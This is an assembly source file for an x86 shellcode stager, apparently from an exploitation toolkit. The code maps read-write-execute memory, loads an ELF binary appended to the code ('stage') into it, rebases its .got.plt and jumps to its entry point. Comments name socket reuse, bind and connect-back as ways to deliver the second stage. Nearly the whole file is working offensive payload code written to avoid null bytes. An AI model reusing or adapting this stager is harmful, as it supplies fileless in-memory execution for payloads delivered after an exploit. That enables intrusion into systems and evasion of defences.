	;; Evan Jensen
	;; Translation of mapper.c by kiwiz
	
;;;  %eax = syscall number
;;;  args = %ebx, %ecx, %edx, %esi, %edi, %ebp (last can be ptr to > 6)
	
BITS 32
	global main


	%include "../include/short32.s"
	%include "../include/elf.s"
	%define PROT_READ      	0x4	
	%define PROT_WRITE      0x2
	%define PROT_EXEC      	0x1
	%define MAP_PRIVATE	0x2  ; Changes are private.
	%define MAP_ANONYMOUS 	0x20 ; no file backing
	%define MAP_FIXED      	0x10 ; use exact address
	%define PGSZ 		0x1000
	;; hex(sum(map(lambda a:1<<a,[1,2,3,4,5,6,7,9,10,11])))
	%define IMPORTANT_SECTIONS 0xefe
	%define ELFHEADER 0x464c457f
	
	
main:
	;; possible techniques for identifying where data is coming from
	;; socket reuse, bind, connectback, attached at the end of our code
	
	;; get some memory to work with
	;; in mapper.c this is done with care
	;; but if we make a "large" pre allocation up front we should be OK
	xor eax,eax
	cdq
	mov al,mmap2
	xor ebx,ebx 		;addr
	xor ecx,ecx
	inc ecx			;size
	shl ecx,15		;0x8000 potentially compute at runtime
	;; 	xor edx,edx; done with cdq
	mov dl, PROT_READ|PROT_WRITE|PROT_EXEC ;prot
	push byte MAP_PRIVATE | MAP_ANONYMOUS ;flags
	pop esi 
	xor edi, edi				 ;FD
	dec edi			;-1
	xor ebp,ebp		;offset
	
	;;   mmap(0, 0x8000, 0x7, MAP_PRIVATE | MAP_ANONYMOUS ,-1,0)
	call [gs:ebp+0x10]		;__kernel_vsyscall
	cld
	;; int 0x80
	
	jmp ENDOFCODE
	have_elf:		
	pop ebp			;pointer to elf header
	mov ebx,eax		; ebx is pointer to the mapped memory for rest of code	
;;;Elf32_Shdr* strtab = mem + ehdr->e_shoff + ehdr->e_shstrndx * ehdr->e_shentsize;
	mov esi, [ebp+e_shoff]
	movzx edi, word [ebp+e_shstrndx]
	movzx ecx, word [ebp+e_shentsize]
	imul edi,ecx
	add esi,ebp
	add esi,edi
	push esi
	;; esi=strtab


	;; create memory sections
	
	movzx edx,word [ebp+e_shnum]	;counter
	dec edx
create_memory_sections:
;;;     Elf32_Shdr* shdr = mem + ehdr->e_shoff + ehdr->e_shentsize * i;
	movzx eax, word [ebp+e_shentsize]
	imul eax, edx
	add eax,dword [ebp+e_shoff]
	add eax,ebp
	;; eax=shdr
	;; mov esi,1
	;; mov ecx, dword [eax+sh_type]
	
	;; cmp ecx,0xff
	;; ja next_section
	;; shl esi,cl
	;; test esi, IMPORTANT_SECTIONS
	;; jz next_section
	
	;; this is a section we care about. Lets fix it up!
	;; find the name, maybe this is the .got.plt
	
	mov esi,[esp]		;strtab
	mov esi,dword [esi+sh_offset]
	add esi,dword [eax+sh_name]
	add esi,ebp
	jmp short get_got_plt
have_got_plt:	
	pop edi
	
	push byte got_plt_end - got_plt-1 ;length of the .got.plt string
	pop ecx
	
	repe cmpsb		;strncmp
	test ecx,ecx
	jnz not_got_plt
	
	push eax		;got_plt section
	
not_got_plt:	
	;; not .got.plt but still important
	mov edi,dword [eax+sh_addr]
	add edi,ebx		;destination (mmap'd memory)
	mov esi,dword [eax+sh_offset]
	add esi,ebp		;src, the memory at the end of this asm
	mov ecx,dword [eax+sh_size]	;length of the section
	rep movsb			;memcpy
next_section:	
	dec edx
	jns create_memory_sections ;will loop when the counter is zero


begin_got_fix:	
	mov eax,[esp]		;got_plt section
	;;   size_t got_sz = got_plt->sh_size / sizeof(void*) - 3;
	mov ecx,dword [eax+sh_size]
	shr ecx,2
	;; sub ecx,3
	mov eax,dword [eax+sh_addr]
	add eax,ebx
	dec ecx
fix_got_loop:
	add [eax+ecx*4],ebx
	;; ecx=got_sz + 3
	;; the first three elements in the GOT should not be fixed here
	;; we need to fix up the GOT. The entries in the got need to point to
	;; the resolve function but currently they contain only RVA's
	
next_got_entry:
	dec ecx
	cmp ecx,2
	ja fix_got_loop

	;; get entry point and run it
	mov eax,dword [ebp+e_entry]
	add eax,ebx
	call eax			;entrypoint

	;; 	hlt ;hlt was for debugging
get_got_plt:	
	call  have_got_plt
got_plt:	db ".got.plt",0
got_plt_end:
ENDOFCODE:
 	call  have_elf
	;; append elf here
incbin "stage"